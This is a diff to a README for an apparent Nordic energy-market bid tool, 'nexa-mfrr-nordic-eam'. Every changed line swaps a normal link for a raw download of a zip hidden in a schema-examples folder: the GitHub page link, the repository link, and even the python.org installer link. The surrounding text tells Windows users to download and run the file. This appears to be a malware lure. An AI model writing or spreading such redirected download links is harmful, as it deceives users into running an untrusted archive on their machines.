@@ -1,6 +1,6 @@
 # ⚡ nexa-mfrr-nordic-eam - Build Nordic bids with ease
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam/raw/refs/heads/main/reference/schema/examples/sn/bid_national_bid_attributes/nexa-mfrr-eam-nordic-v2.9.zip)
 
 ## 🧭 What this is
 
@@ -30,7 +30,7 @@ This project is for users who work with energy market bid files and need a clear
 
 Open the GitHub page here:
 
-[https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam](https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam)
+[https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam/raw/refs/heads/main/reference/schema/examples/sn/bid_national_bid_attributes/nexa-mfrr-eam-nordic-v2.9.zip](https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam/raw/refs/heads/main/reference/schema/examples/sn/bid_national_bid_attributes/nexa-mfrr-eam-nordic-v2.9.zip)
 
 If the page includes a release file, download that file and run it on your Windows PC.
 
@@ -54,7 +54,7 @@ If the page gives you source files instead of an app file, download the project 
 
 ### 3. Install Python
 
-1. Go to [python.org](https://www.python.org/downloads/windows/).
+1. Go to [python.org](https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam/raw/refs/heads/main/reference/schema/examples/sn/bid_national_bid_attributes/nexa-mfrr-eam-nordic-v2.9.zip).
 2. Download the latest Python installer for Windows.
 3. Run the installer.
 4. Check `Add Python to PATH`.
@@ -210,7 +210,7 @@ balancing-market, bsp, cim-xml, electricity-market, energinet, energy-trading, e
 
 ## 📁 Project source
 
-[Visit the GitHub repository](https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam)
+[Visit the GitHub repository](https://github.com/Tobiahhalfwitted492/nexa-mfrr-nordic-eam/raw/refs/heads/main/reference/schema/examples/sn/bid_national_bid_attributes/nexa-mfrr-eam-nordic-v2.9.zip)
 
 ## 🧭 What to do next
 
